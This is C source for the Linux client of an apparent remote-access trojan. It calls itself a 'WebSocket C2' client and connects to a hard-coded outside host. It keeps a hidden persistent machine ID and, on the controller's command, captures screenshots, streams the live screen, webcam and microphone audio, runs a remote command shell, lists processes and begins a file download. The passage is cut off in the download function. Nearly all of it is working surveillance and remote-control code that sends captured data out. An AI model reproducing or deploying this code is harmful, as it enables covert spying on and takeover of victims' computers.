/*
 * Linux Client for WebSocket C2 Server
 * Connects to server.py via WebSocket
 * 
 * Compile: gcc client_linux.c -o client_linux -lpthread -lcrypto
 * Or: gcc client_linux.c -o client_linux -lpthread -lssl -lcrypto
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <dirent.h>
#include <pwd.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>

#define BUFFER_SIZE 65536
#define RECONNECT_DELAY 5
#define PING_INTERVAL 10

// ============== CONFIGURATION ==============
// Change these to your server
char g_server_host[256] = "api.root1.me";
char g_server_port[6] = "80";
char g_server_path[256] = "/";

// Global variables
int g_sock = -1;
char g_hostname[256];
char g_username[256];
char g_client_id[64];  // Unique client identifier (persisted)
char g_current_dir[4096];
volatile int g_connected = 0;
volatile int g_should_exit = 0;
int g_session_id = 0;
time_t g_last_ping_time = 0;

// Input logger state
static pthread_t g_inputlog_thread;
static volatile int g_inputlog_running = 0;
static char g_inputlog_path[4096];

// Ping thread state
static pthread_t g_ping_thread;
static volatile int g_ping_running = 0;

// Camera state
static int g_current_camera = 0;
static int g_num_cameras = 0;
static char g_camera_devices[10][64];  // Store up to 10 camera device paths

// Live view state
static pthread_t g_liveview_thread;
static volatile int g_liveview_running = 0;
static int g_liveview_fps = 30;
static int g_liveview_quality = 80;
static int g_liveview_scale = 50;

// Camera view state
static pthread_t g_camview_thread;
static volatile int g_camview_running = 0;
static int g_camview_fps = 15;
static int g_camview_quality = 70;

// Live audio state
static pthread_t g_liveaudio_thread;
static volatile int g_liveaudio_running = 0;
static int g_liveaudio_samplerate = 22050;

// Base64 encoding table
static const char base64_chars[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void base64_encode(const unsigned char* input, int length, char* output) {
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];
    
    while (length--) {
        char_array_3[i++] = *(input++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for(i = 0; i < 4; i++)
                output[j++] = base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    
    if (i) {
        for(int k = i; k < 3; k++)
            char_array_3[k] = '\0';
        
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        
        for (int k = 0; k < i + 1; k++)
            output[j++] = base64_chars[char_array_4[k]];
        
        while(i++ < 3)
            output[j++] = '=';
    }
    output[j] = '\0';
}

void generate_websocket_key(char* key) {
    unsigned char random_bytes[16];
    srand(time(NULL) ^ getpid());
    
    for (int i = 0; i < 16; i++) {
        random_bytes[i] = rand() % 256;
    }
    
    base64_encode(random_bytes, 16, key);
}

int websocket_handshake() {
    char key[32];
    char request[1024];
    char response[4096];
    
    generate_websocket_key(key);
    
    snprintf(request, sizeof(request),
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\n"
        "\r\n",
        g_server_path, g_server_host, key);
    
    if (send(g_sock, request, strlen(request), 0) <= 0) {
        return 0;
    }
    
    int received = recv(g_sock, response, sizeof(response) - 1, 0);
    if (received <= 0) {
        return 0;
    }
    
    response[received] = '\0';
    
    if (strstr(response, "101") == NULL || strstr(response, "Switching Protocols") == NULL) {
        return 0;
    }
    
    return 1;
}

void create_websocket_frame(const char* data, int len, unsigned char* frame, int* frame_len) {
    int pos = 0;
    
    frame[pos++] = 0x81;  // Text frame, FIN bit set
    
    if (len < 126) {
        frame[pos++] = 0x80 | len;  // Masked
    } else if (len < 65536) {
        frame[pos++] = 0x80 | 126;
        frame[pos++] = (len >> 8) & 0xFF;
        frame[pos++] = len & 0xFF;
    } else {
        frame[pos++] = 0x80 | 127;
        for (int i = 7; i >= 0; i--) {
            frame[pos++] = (len >> (i * 8)) & 0xFF;
        }
    }
    
    // Generate mask
    unsigned char mask[4];
    for (int i = 0; i < 4; i++) {
        mask[i] = rand() % 256;
        frame[pos++] = mask[i];
    }
    
    // Mask and copy data
    for (int i = 0; i < len; i++) {
        frame[pos++] = data[i] ^ mask[i % 4];
    }
    
    *frame_len = pos;
}

int send_websocket_data(const char* data, int len) {
    if (g_sock < 0 || !g_connected) return 0;
    
    int max_frame_size = len + 14;  // Max overhead
    unsigned char* frame = malloc(max_frame_size);
    if (!frame) return 0;
    
    int frame_len;
    create_websocket_frame(data, len, frame, &frame_len);
    
    int sent = send(g_sock, frame, frame_len, 0);
    free(frame);
    
    return sent > 0;
}

int parse_websocket_frame(unsigned char* data, int len, char* output, int* output_len) {
    if (len < 2) return 0;
    
    int pos = 0;
    unsigned char first_byte = data[pos++];
    unsigned char second_byte = data[pos++];
    
    int opcode = first_byte & 0x0F;
    int masked = (second_byte & 0x80) != 0;
    long payload_len = second_byte & 0x7F;
    
    if (payload_len == 126) {
        if (len < 4) return 0;
        payload_len = (data[pos] << 8) | data[pos + 1];
        pos += 2;
    } else if (payload_len == 127) {
        if (len < 10) return 0;
        payload_len = 0;
        for (int i = 0; i < 8; i++) {
            payload_len = (payload_len << 8) | data[pos + i];
        }
        pos += 8;
    }
    
    unsigned char mask[4] = {0};
    if (masked) {
        if (len < pos + 4) return 0;
        memcpy(mask, data + pos, 4);
        pos += 4;
    }
    
    if (len < pos + payload_len) return 0;
    
    // Handle ping
    if (opcode == 0x09) {
        unsigned char pong[256];
        int pong_len;
        pong[0] = 0x8A;  // Pong
        pong[1] = 0x80 | (payload_len & 0x7F);
        unsigned char pong_mask[4];
        for (int i = 0; i < 4; i++) {
            pong_mask[i] = rand() % 256;
            pong[2 + i] = pong_mask[i];
        }
        for (int i = 0; i < payload_len && i < 125; i++) {
            pong[6 + i] = data[pos + i] ^ pong_mask[i % 4];
        }
        pong_len = 6 + (payload_len < 125 ? payload_len : 125);
        send(g_sock, pong, pong_len, 0);
        *output_len = 0;
        return pos + payload_len;
    }
    
    // Handle close
    if (opcode == 0x08) {
        g_connected = 0;
        *output_len = 0;
        return pos + payload_len;
    }
    
    // Copy payload
    for (int i = 0; i < payload_len; i++) {
        if (masked)
            output[i] = data[pos + i] ^ mask[i % 4];
        else
            output[i] = data[pos + i];
    }
    output[payload_len] = '\0';
    *output_len = payload_len;
    
    return pos + payload_len;
}

void send_websocket_ping() {
    if (g_sock < 0 || !g_connected) return;
    
    unsigned char ping_frame[6];
    ping_frame[0] = 0x89;  // Ping opcode
    ping_frame[1] = 0x80;  // Masked, 0 length
    for (int i = 0; i < 4; i++) {
        ping_frame[2 + i] = rand() % 256;
    }
    send(g_sock, ping_frame, 6, 0);
}

// Generate or load unique client ID (persisted in hidden file)
void init_client_id() {
    char* home = getenv("HOME");
    char id_file[4096];
    
    if (!home) {
        // Fallback: generate random ID (not persisted)
        snprintf(g_client_id, sizeof(g_client_id), "%08lX%08lX", 
                 (unsigned long)time(NULL), (unsigned long)getpid());
        return;
    }
    
    // Hidden directory for ID file
    char id_dir[4096];
    snprintf(id_dir, sizeof(id_dir), "%s/.cache", home);
    mkdir(id_dir, 0700);
    
    snprintf(id_file, sizeof(id_file), "%s/.machine_id", id_dir);
    
    // Try to read existing ID
    FILE* f = fopen(id_file, "r");
    if (f) {
        if (fgets(g_client_id, 32, f)) {
            // Remove newline
            g_client_id[strcspn(g_client_id, "\n")] = 0;
            if (strlen(g_client_id) >= 16) {
                fclose(f);
                return;
            }
        }
        fclose(f);
    }
    
    // Generate new unique ID
    struct stat st;
    unsigned long dev_id = 0;
    if (stat("/", &st) == 0) {
        dev_id = st.st_dev;
    }
    
    snprintf(g_client_id, sizeof(g_client_id), "%08lX%08lX%08lX%04X",
             dev_id,
             (unsigned long)time(NULL),
             (unsigned long)getpid(),
             (unsigned int)(rand() & 0xFFFF));
    
    // Save for persistence
    f = fopen(id_file, "w");
    if (f) {
        fprintf(f, "%s\n", g_client_id);
        fclose(f);
    }
}

void* ping_thread_func(void* arg) {
    while (g_ping_running && g_connected) {
        sleep(PING_INTERVAL);
        if (g_connected) {
            send_websocket_ping();
        }
    }
    return NULL;
}

int connect_to_server() {
    struct addrinfo hints, *result, *rp;
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    
    if (getaddrinfo(g_server_host, g_server_port, &hints, &result) != 0) {
        return 0;
    }
    
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        g_sock = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (g_sock < 0) continue;
        
        // Set socket options for better performance
        int flag = 1;
        setsockopt(g_sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
        
        int buf_size = 262144;  // 256KB buffers
        setsockopt(g_sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        setsockopt(g_sock, SOL_SOCKET, SO_RCVBUF, &buf_size, sizeof(buf_size));
        
        if (connect(g_sock, rp->ai_addr, rp->ai_addrlen) == 0) {
            break;
        }
        
        close(g_sock);
        g_sock = -1;
    }
    
    freeaddrinfo(result);
    
    if (g_sock < 0) return 0;
    
    // WebSocket handshake
    if (!websocket_handshake()) {
        close(g_sock);
        g_sock = -1;
        return 0;
    }
    
    g_connected = 1;
    return 1;
}

void cleanup_socket() {
    if (g_sock >= 0) {
        close(g_sock);
        g_sock = -1;
    }
    g_connected = 0;
}

// ============== SCREENSHOT (X11) ==============
void take_screenshot() {
    // Try using scrot or import (ImageMagick)
    char temp_file[256];
    snprintf(temp_file, sizeof(temp_file), "/tmp/.screenshot_%d.png", getpid());
    
    char cmd[512];
    
    // Try scrot first
    snprintf(cmd, sizeof(cmd), "scrot -z '%s' 2>/dev/null || import -window root '%s' 2>/dev/null", temp_file, temp_file);
    int ret = system(cmd);
    
    // Check if file exists
    FILE* f = fopen(temp_file, "rb");
    if (!f) {
        send_websocket_data("[!] Screenshot failed - install scrot or imagemagick\n", 53);
        return;
    }
    
    // Get file size
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size <= 0 || file_size > 50 * 1024 * 1024) {
        fclose(f);
        unlink(temp_file);
        send_websocket_data("[!] Screenshot file invalid\n", 28);
        return;
    }
    
    // Read file
    unsigned char* data = malloc(file_size);
    if (!data) {
        fclose(f);
        unlink(temp_file);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    fread(data, 1, file_size, f);
    fclose(f);
    unlink(temp_file);
    
    // Base64 encode
    int b64_size = ((file_size + 2) / 3) * 4 + 1;
    char* b64_data = malloc(b64_size);
    if (!b64_data) {
        free(data);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    base64_encode(data, file_size, b64_data);
    free(data);
    
    // Send with markers
    char header[128];
    snprintf(header, sizeof(header), "<<<SCREENSHOT_PNG>>>%ld<<<DATA>>>", file_size);
    send_websocket_data(header, strlen(header));
    
    // Send in chunks
    int b64_len = strlen(b64_data);
    int sent = 0;
    int chunk_size = 4096;
    
    while (sent < b64_len && g_connected) {
        int to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        send_websocket_data(b64_data + sent, to_send);
        sent += to_send;
        usleep(10000);  // Small delay
    }
    
    free(b64_data);
    
    send_websocket_data("<<<SCREENSHOT_END>>>", 20);
    send_websocket_data("\n[+] Screenshot captured\n", 25);
}

// ============== LIVE VIEW STREAMING ==============
void* liveview_thread_func(void* arg) {
    char temp_file[256];
    snprintf(temp_file, sizeof(temp_file), "/tmp/.liveview_%d.jpg", getpid());
    
    // Calculate frame interval
    int frame_delay_us = 1000000 / g_liveview_fps;
    
    // Pre-allocate buffers
    unsigned char* jpeg_data = malloc(2 * 1024 * 1024);  // 2MB for JPEG
    char* b64_data = malloc(3 * 1024 * 1024);  // 3MB for base64
    char send_buffer[16384];  // 16KB chunk buffer
    
    if (!jpeg_data || !b64_data) {
        if (jpeg_data) free(jpeg_data);
        if (b64_data) free(b64_data);
        g_liveview_running = 0;
        return NULL;
    }
    
    send_websocket_data("<<<LIVEVIEW_START>>>\n", 21);
    
    while (g_liveview_running && g_connected) {
        struct timespec frame_start;
        clock_gettime(CLOCK_MONOTONIC, &frame_start);
        
        // Capture screen using scrot or import with quality and scale
        char cmd[512];
        snprintf(cmd, sizeof(cmd), 
            "scrot -z -q %d '%s' 2>/dev/null || "
            "import -quality %d -resize %d%% -window root '%s' 2>/dev/null",
            g_liveview_quality, temp_file,
            g_liveview_quality, g_liveview_scale, temp_file);
        
        if (system(cmd) != 0) {
            // Try alternative methods
            snprintf(cmd, sizeof(cmd),
                "ffmpeg -y -f x11grab -video_size 1920x1080 -i :0.0 -frames:v 1 -q:v %d '%s' 2>/dev/null",
                (100 - g_liveview_quality) / 10 + 1, temp_file);
            system(cmd);
        }
        
        // Read captured file
        FILE* f = fopen(temp_file, "rb");
        if (!f) {
            usleep(frame_delay_us);
            continue;
        }
        
        fseek(f, 0, SEEK_END);
        long file_size = ftell(f);
        fseek(f, 0, SEEK_SET);
        
        if (file_size <= 0 || file_size > 2 * 1024 * 1024) {
            fclose(f);
            unlink(temp_file);
            usleep(frame_delay_us);
            continue;
        }
        
        fread(jpeg_data, 1, file_size, f);
        fclose(f);
        unlink(temp_file);
        
        // Base64 encode
        base64_encode(jpeg_data, file_size, b64_data);
        
        // Send frame with marker
        char header[128];
        snprintf(header, sizeof(header), "<<<LIVEVIEW_FRAME>>>%ld<<<DATA>>>", file_size);
        send_websocket_data(header, strlen(header));
        
        // Send base64 data in larger chunks
        int b64_len = strlen(b64_data);
        int sent = 0;
        
        while (sent < b64_len && g_liveview_running && g_connected) {
            int to_send = (b64_len - sent < 16384) ? (b64_len - sent) : 16384;
            send_websocket_data(b64_data + sent, to_send);
            sent += to_send;
        }
        
        send_websocket_data("<<<FRAME_END>>>", 15);
        
        // Calculate sleep time for target FPS
        struct timespec frame_end;
        clock_gettime(CLOCK_MONOTONIC, &frame_end);
        long elapsed_us = (frame_end.tv_sec - frame_start.tv_sec) * 1000000 +
                          (frame_end.tv_nsec - frame_start.tv_nsec) / 1000;
        
        if (elapsed_us < frame_delay_us) {
            usleep(frame_delay_us - elapsed_us);
        }
    }
    
    free(jpeg_data);
    free(b64_data);
    
    send_websocket_data("<<<LIVEVIEW_STOPPED>>>\n", 23);
    return NULL;
}

void start_liveview(int fps, int quality) {
    if (g_liveview_running) {
        send_websocket_data("[!] Liveview already running. Use 'stoplive' first.\n", 52);
        return;
    }
    
    // Clamp values
    if (fps < 1) fps = 1;
    if (fps > 60) fps = 60;
    if (quality < 10) quality = 10;
    if (quality > 100) quality = 100;
    
    g_liveview_fps = fps;
    g_liveview_quality = quality;
    g_liveview_running = 1;
    
    pthread_create(&g_liveview_thread, NULL, liveview_thread_func, NULL);
    
    char msg[128];
    snprintf(msg, sizeof(msg), "[+] Liveview started: %d FPS, %d%% quality\n", fps, quality);
    send_websocket_data(msg, strlen(msg));
}

void stop_liveview() {
    if (!g_liveview_running) {
        send_websocket_data("[!] Liveview not running.\n", 26);
        return;
    }
    
    g_liveview_running = 0;
    pthread_join(g_liveview_thread, NULL);
    send_websocket_data("[+] Liveview stopped.\n", 22);
}

// ============== LIVE CAMERA VIEW ==============
void* camview_thread_func(void* arg) {
    detect_cameras();
    
    if (g_num_cameras == 0) {
        send_websocket_data("[!] No cameras found\n", 21);
        g_camview_running = 0;
        return NULL;
    }
    
    char temp_file[256];
    snprintf(temp_file, sizeof(temp_file), "/tmp/.camview_%d.jpg", getpid());
    char* device = g_camera_devices[g_current_camera];
    
    int frame_delay_us = 1000000 / g_camview_fps;
    
    unsigned char* jpeg_data = malloc(1024 * 1024);
    char* b64_data = malloc(2 * 1024 * 1024);
    
    if (!jpeg_data || !b64_data) {
        if (jpeg_data) free(jpeg_data);
        if (b64_data) free(b64_data);
        g_camview_running = 0;
        return NULL;
    }
    
    send_websocket_data("<<<CAMVIEW_START>>>\n", 20);
    
    while (g_camview_running && g_connected) {
        struct timespec frame_start;
        clock_gettime(CLOCK_MONOTONIC, &frame_start);
        
        // Capture from camera
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
            "ffmpeg -y -f v4l2 -video_size 640x480 -i %s -frames:v 1 -q:v %d '%s' >/dev/null 2>&1 || "
            "fswebcam -d %s -r 640x480 --no-banner --jpeg %d '%s' 2>/dev/null",
            device, (100 - g_camview_quality) / 10 + 1, temp_file,
            device, g_camview_quality, temp_file);
        system(cmd);
        
        FILE* f = fopen(temp_file, "rb");
        if (!f) {
            usleep(frame_delay_us);
            continue;
        }
        
        fseek(f, 0, SEEK_END);
        long file_size = ftell(f);
        fseek(f, 0, SEEK_SET);
        
        if (file_size <= 0 || file_size > 1024 * 1024) {
            fclose(f);
            unlink(temp_file);
            usleep(frame_delay_us);
            continue;
        }
        
        fread(jpeg_data, 1, file_size, f);
        fclose(f);
        unlink(temp_file);
        
        base64_encode(jpeg_data, file_size, b64_data);
        
        char header[128];
        snprintf(header, sizeof(header), "<<<CAMVIEW_JPEG>>>%ld<<<DATA>>>", file_size);
        send_websocket_data(header, strlen(header));
        
        int b64_len = strlen(b64_data);
        int sent = 0;
        
        while (sent < b64_len && g_camview_running && g_connected) {
            int to_send = (b64_len - sent < 16384) ? (b64_len - sent) : 16384;
            send_websocket_data(b64_data + sent, to_send);
            sent += to_send;
        }
        
        send_websocket_data("<<<CAMFRAME_END>>>", 18);
        
        struct timespec frame_end;
        clock_gettime(CLOCK_MONOTONIC, &frame_end);
        long elapsed_us = (frame_end.tv_sec - frame_start.tv_sec) * 1000000 +
                          (frame_end.tv_nsec - frame_start.tv_nsec) / 1000;
        
        if (elapsed_us < frame_delay_us) {
            usleep(frame_delay_us - elapsed_us);
        }
    }
    
    free(jpeg_data);
    free(b64_data);
    
    send_websocket_data("<<<CAMVIEW_STOPPED>>>\n", 22);
    return NULL;
}

void start_camview(int fps, int quality) {
    if (g_camview_running) {
        send_websocket_data("[!] Camview already running. Use 'stopcam' first.\n", 50);
        return;
    }
    
    if (fps < 1) fps = 1;
    if (fps > 30) fps = 30;
    if (quality < 10) quality = 10;
    if (quality > 100) quality = 100;
    
    g_camview_fps = fps;
    g_camview_quality = quality;
    g_camview_running = 1;
    
    pthread_create(&g_camview_thread, NULL, camview_thread_func, NULL);
    
    char msg[128];
    snprintf(msg, sizeof(msg), "[+] Camview started: %d FPS, %d%% quality\n", fps, quality);
    send_websocket_data(msg, strlen(msg));
}

void stop_camview() {
    if (!g_camview_running) {
        send_websocket_data("[!] Camview not running.\n", 25);
        return;
    }
    
    g_camview_running = 0;
    pthread_join(g_camview_thread, NULL);
    send_websocket_data("[+] Camview stopped.\n", 21);
}

// ============== LIVE AUDIO STREAMING (ALSA) ==============
void* liveaudio_thread_func(void* arg) {
    // Try to capture audio using arecord (ALSA)
    char audio_buffer[4096];
    
    char cmd[256];
    snprintf(cmd, sizeof(cmd), 
        "arecord -f S16_LE -r %d -c 1 -t raw 2>/dev/null",
        g_liveaudio_samplerate);
    
    FILE* fp = popen(cmd, "r");
    if (!fp) {
        send_websocket_data("[!] Cannot start audio capture. Install alsa-utils.\n", 52);
        g_liveaudio_running = 0;
        return NULL;
    }
    
    // Pre-allocate base64 buffer
    char* b64_data = malloc(8192);
    if (!b64_data) {
        pclose(fp);
        g_liveaudio_running = 0;
        return NULL;
    }
    
    char header[64];
    snprintf(header, sizeof(header), "<<<LIVEAUDIO_START>>>%d|1\n", g_liveaudio_samplerate);
    send_websocket_data(header, strlen(header));
    
    while (g_liveaudio_running && g_connected) {
        int bytes_read = fread(audio_buffer, 1, sizeof(audio_buffer), fp);
        if (bytes_read <= 0) break;
        
        base64_encode((unsigned char*)audio_buffer, bytes_read, b64_data);
        
        send_websocket_data("<<<AUDIO_CHUNK>>>", 17);
        send_websocket_data("<<<DATA>>>", 10);
        send_websocket_data(b64_data, strlen(b64_data));
        send_websocket_data("<<<CHUNK_END>>>", 15);
    }
    
    free(b64_data);
    pclose(fp);
    
    send_websocket_data("<<<LIVEAUDIO_STOPPED>>>\n", 24);
    return NULL;
}

void start_liveaudio(int samplerate) {
    if (g_liveaudio_running) {
        send_websocket_data("[!] Live audio already running. Use 'stopaudio' first.\n", 55);
        return;
    }
    
    if (samplerate < 8000) samplerate = 8000;
    if (samplerate > 48000) samplerate = 48000;
    
    g_liveaudio_samplerate = samplerate;
    g_liveaudio_running = 1;
    
    pthread_create(&g_liveaudio_thread, NULL, liveaudio_thread_func, NULL);
    
    char msg[128];
    snprintf(msg, sizeof(msg), "[+] Live audio started: %d Hz\n", samplerate);
    send_websocket_data(msg, strlen(msg));
}

void stop_liveaudio() {
    if (!g_liveaudio_running) {
        send_websocket_data("[!] Live audio not running.\n", 28);
        return;
    }
    
    g_liveaudio_running = 0;
    pthread_join(g_liveaudio_thread, NULL);
    send_websocket_data("[+] Live audio stopped.\n", 24);
}

// ============== CAMERA FUNCTIONS ==============

// Detect available cameras
void detect_cameras() {
    g_num_cameras = 0;
    char device[64];
    
    // Check /dev/video* devices
    for (int i = 0; i < 10; i++) {
        snprintf(device, sizeof(device), "/dev/video%d", i);
        if (access(device, R_OK) == 0) {
            strncpy(g_camera_devices[g_num_cameras], device, sizeof(g_camera_devices[0]) - 1);
            g_num_cameras++;
        }
    }
}

// List available cameras
void list_cameras() {
    detect_cameras();
    
    if (g_num_cameras == 0) {
        send_websocket_data("[!] No cameras found. Make sure /dev/video* devices exist.\n", 59);
        return;
    }
    
    char msg[1024];
    send_websocket_data("\n[*] Available cameras:\n", 24);
    
    for (int i = 0; i < g_num_cameras; i++) {
        // Try to get camera name using v4l2
        char cmd[256], name[256] = "Unknown";
        snprintf(cmd, sizeof(cmd), "v4l2-ctl --device=%s --info 2>/dev/null | grep 'Card type' | cut -d':' -f2 | xargs", g_camera_devices[i]);
        
        FILE* fp = popen(cmd, "r");
        if (fp) {
            if (fgets(name, sizeof(name), fp)) {
                // Remove newline
                int len = strlen(name);
                if (len > 0 && name[len-1] == '\n') name[len-1] = '\0';
            }
            pclose(fp);
        }
        
        snprintf(msg, sizeof(msg), "  [%d] %s (%s)", i, g_camera_devices[i], strlen(name) > 0 ? name : "Camera");
        if (i == g_current_camera) {
            strcat(msg, " <- SELECTED");
        }
        strcat(msg, "\n");
        send_websocket_data(msg, strlen(msg));
    }
    
    snprintf(msg, sizeof(msg), "\n[*] Total: %d camera(s). Use 'selectcam <number>' to switch.\n", g_num_cameras);
    send_websocket_data(msg, strlen(msg));
}

// Select a camera
void select_camera(int index) {
    detect_cameras();
    
    char msg[256];
    
    if (index < 0 || index >= g_num_cameras) {
        snprintf(msg, sizeof(msg), "[!] Camera %d not found. Use 'listcam' to see available cameras.\n", index);
        send_websocket_data(msg, strlen(msg));
        return;
    }
    
    g_current_camera = index;
    snprintf(msg, sizeof(msg), "[+] Selected camera %d: %s\n", index, g_camera_devices[index]);
    send_websocket_data(msg, strlen(msg));
}

// Take a webcam photo using ffmpeg or streamer
void take_camshot() {
    detect_cameras();
    
    if (g_num_cameras == 0) {
        send_websocket_data("[!] No cameras found\n", 21);
        return;
    }
    
    send_websocket_data("[*] Capturing camera photo...\n", 30);
    
    char temp_file[256];
    snprintf(temp_file, sizeof(temp_file), "/tmp/.camshot_%d.jpg", getpid());
    
    char* device = g_camera_devices[g_current_camera];
    char cmd[512];
    int success = 0;
    
    // Method 1: ffmpeg (most reliable)
    snprintf(cmd, sizeof(cmd), 
        "ffmpeg -y -f v4l2 -video_size 640x480 -i %s -frames:v 1 '%s' >/dev/null 2>&1",
        device, temp_file);
    
    if (system(cmd) == 0 && access(temp_file, R_OK) == 0) {
        success = 1;
    }
    
    // Method 2: fswebcam
    if (!success) {
        snprintf(cmd, sizeof(cmd), 
            "fswebcam -d %s -r 640x480 --no-banner --jpeg 85 '%s' 2>/dev/null",
            device, temp_file);
        
        if (system(cmd) == 0 && access(temp_file, R_OK) == 0) {
            success = 1;
        }
    }
    
    // Method 3: streamer
    if (!success) {
        snprintf(cmd, sizeof(cmd), 
            "streamer -c %s -o '%s' -s 640x480 2>/dev/null",
            device, temp_file);
        
        if (system(cmd) == 0 && access(temp_file, R_OK) == 0) {
            success = 1;
        }
    }
    
    // Method 4: v4l2-ctl + convert
    if (!success) {
        char raw_file[256];
        snprintf(raw_file, sizeof(raw_file), "/tmp/.camshot_%d.raw", getpid());
        
        snprintf(cmd, sizeof(cmd), 
            "v4l2-ctl --device=%s --stream-mmap --stream-count=1 --stream-to='%s' 2>/dev/null",
            device, raw_file);
        
        if (system(cmd) == 0 && access(raw_file, R_OK) == 0) {
            // Convert to JPEG
            snprintf(cmd, sizeof(cmd),
                "convert -size 640x480 -depth 8 '%s' '%s' 2>/dev/null",
                raw_file, temp_file);
            system(cmd);
            unlink(raw_file);
            
            if (access(temp_file, R_OK) == 0) {
                success = 1;
            }
        }
    }
    
    if (!success) {
        send_websocket_data("[!] Camera capture failed. Install ffmpeg, fswebcam, or streamer.\n", 66);
        return;
    }
    
    // Read the captured image
    FILE* f = fopen(temp_file, "rb");
    if (!f) {
        send_websocket_data("[!] Failed to read captured image\n", 34);
        return;
    }
    
    fseek(f, 0, SEEK_END);
    long file_size = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    if (file_size <= 0 || file_size > 10 * 1024 * 1024) {
        fclose(f);
        unlink(temp_file);
        send_websocket_data("[!] Captured image invalid\n", 27);
        return;
    }
    
    unsigned char* data = malloc(file_size);
    if (!data) {
        fclose(f);
        unlink(temp_file);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    fread(data, 1, file_size, f);
    fclose(f);
    unlink(temp_file);
    
    // Base64 encode
    int b64_size = ((file_size + 2) / 3) * 4 + 1;
    char* b64_data = malloc(b64_size);
    if (!b64_data) {
        free(data);
        send_websocket_data("[!] Memory allocation failed\n", 29);
        return;
    }
    
    base64_encode(data, file_size, b64_data);
    free(data);
    
    // Send with CAMSHOT markers (server expects this format)
    // Using JPEG format: send as 640x480 placeholder since server will just save the JPEG
    char header[256];
    snprintf(header, sizeof(header), "<<<CAMSHOT_START>>>640|480|%ld<<<DATA_START>>>", file_size);
    send_websocket_data(header, strlen(header));
    
    // Send in chunks
    int b64_len = strlen(b64_data);
    int sent = 0;
    int chunk_size = 1024;
    
    while (sent < b64_len && g_connected) {
        int to_send = (b64_len - sent < chunk_size) ? (b64_len - sent) : chunk_size;
        send_websocket_data(b64_data + sent, to_send);
        sent += to_send;
        usleep(30000);
    }
    
    free(b64_data);
    
    usleep(150000);
    send_websocket_data("<<<CAMSHOT_END>>>", 17);
    usleep(50000);
    
    char msg[128];
    snprintf(msg, sizeof(msg), "\n[+] Camera photo captured: %s\n", device);
    send_websocket_data(msg, strlen(msg));
}

// ============== SHELL SESSION ==============
void shell_session() {
    send_websocket_data("[*] Starting shell session. Type 'exit' to return.\n", 51);
    
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE];
    
    while (g_connected && !g_should_exit) {
        // Receive command
        int len = recv(g_sock, buffer, sizeof(buffer) - 1, 0);
        if (len <= 0) break;
        
        int cmd_len;
        char cmd[BUFFER_SIZE];
        parse_websocket_frame((unsigned char*)buffer, len, cmd, &cmd_len);
        
        if (cmd_len <= 0) continue;
        
        // Trim
        while (cmd_len > 0 && (cmd[cmd_len-1] == '\n' || cmd[cmd_len-1] == '\r')) {
            cmd[--cmd_len] = '\0';
        }
        
        if (strcmp(cmd, "exit") == 0) {
            send_websocket_data("[*] Exiting shell\n", 18);
            break;
        }
        
        // Execute command
        FILE* fp = popen(cmd, "r");
        if (!fp) {
            send_websocket_data("[!] Command execution failed\n", 29);
            continue;
        }
        
        while (fgets(output, sizeof(output), fp) != NULL) {
            send_websocket_data(output, strlen(output));
        }
        
        pclose(fp);
    }
}

// ============== PROCESS LIST ==============
void list_processes() {
    DIR* proc_dir = opendir("/proc");
    if (!proc_dir) {
        send_websocket_data("[!] Cannot access /proc\n", 24);
        return;
    }
    
    char header[] = "\nPID\tNAME\n----\t----\n";
    send_websocket_data(header, strlen(header));
    
    struct dirent* entry;
    while ((entry = readdir(proc_dir)) != NULL) {
        // Check if directory name is a number (PID)
        char* endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;
        
        // Read process name
        char comm_path[256];
        snprintf(comm_path, sizeof(comm_path), "/proc/%s/comm", entry->d_name);
        
        FILE* f = fopen(comm_path, "r");
        if (f) {
            char name[256];
            if (fgets(name, sizeof(name), f)) {
                // Remove newline
                name[strcspn(name, "\n")] = 0;
                
                char line[512];
                snprintf(line, sizeof(line), "%ld\t%s\n", pid, name);
                send_websocket_data(line, strlen(line));
            }
            fclose(f);
        }
    }
    
    closedir(proc_dir);
    send_websocket_data("\n", 1);
}

// ============== FILE DOWNLOAD ==============
void download_file(const char* filename) {
    FILE* f = fopen(filename, "rb");
    if (!f) {
        char msg[512];
